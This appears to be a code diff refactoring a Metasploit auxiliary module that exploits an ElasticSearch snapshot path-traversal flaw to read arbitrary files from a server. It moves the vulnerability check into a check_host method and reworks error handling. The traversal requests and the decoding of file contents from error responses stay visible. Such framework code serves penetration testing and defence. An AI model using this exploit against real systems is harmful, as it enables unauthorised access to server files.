@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
     deregister_options('RHOST')
   end
 
-  def proficy?
+  def check_host(ip)
     res1 = send_request_raw(
       'method' => 'POST',
       'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
@@ -58,10 +58,10 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     if res1.body.include?('true') && res2.body.include?('true')
-      return true
-    else
-      return false
+      return Exploit::CheckCode::Appears
     end
+
+    Exploit::CheckCode::Safe
   end
 
   def read_file(file)
@@ -71,15 +71,6 @@ class Metasploit3 < Msf::Auxiliary
 
     travs << payload.gsub('/', '%2f')
     travs << file.gsub('/', '%2f')
-
-    vprint_status("#{peer} - Checking if it's a vulnerable ElasticSearch")
-
-    if proficy?
-      vprint_good("#{peer} - Check successful")
-    else
-      print_error("#{peer} - ElasticSearch not vulnearble")
-      return
-    end
 
     vprint_status("#{peer} - Retrieving file contents...")
 
@@ -91,23 +82,35 @@ class Metasploit3 < Msf::Auxiliary
     if res && res.code == 400
       return res.body
     else
-      print_status("#{res.code}\n#{res.body}")
+      print_status("Server returned HTTP response code: #{res.code}")
+      print_status(res.body)
       return nil
     end
   end
 
   def run_host(ip)
+    vprint_status("#{peer} - Checking if it's a vulnerable ElasticSearch")
+
+    check_code = check_host(ip)
+    print_status("#{peer} - #{check_code.second}")
+    if check_host(ip) != Exploit::CheckCode::Appears
+      return
+    end
+
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ %r{/^\//}
 
     contents = read_file(filename)
-    fail_with(Failure::UnexpectedReply, "#{peer} - File not downloaded") if contents.nil?
+    unless contents
+      print_error("#{peer} - No file downloaded")
+      return
+    end
 
     begin
       data_hash = JSON.parse(contents)
     rescue JSON::ParserError => e
       elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
-      return []
+      return
     end
 
     fcontent = data_hash['error'].scan(/\d+/).drop(2).map(&:to_i).pack('c*')
